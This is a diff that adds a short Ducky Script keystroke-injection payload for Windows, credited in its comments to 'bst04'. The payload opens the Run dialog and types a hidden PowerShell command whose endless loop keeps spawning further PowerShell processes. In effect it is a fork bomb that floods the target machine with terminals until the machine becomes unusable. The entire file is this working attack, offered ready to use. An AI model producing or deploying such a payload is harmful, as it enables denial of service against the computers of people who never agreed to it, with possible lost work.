@@ -1,0 +1,11 @@
+REM =======================================
+REM payload made by bst04
+REM WINDOWS DEVICES
+REM Spams a lot of terminals 
+REM =======================================
+
+DELAY 1500
+GUI r 
+DELAY 250
+STRING powershell -WindowStyle Hidden -Command "while ($true) { Start-Process powershell -ArgumentList '-NoExit', '-Command', 'Start-Process powershell -WindowStyle Hidden -ArgumentList \"-NoExit\", \"-Command\", \"Start-Process powershell -WindowStyle Hidden\"' }"
+ENTER
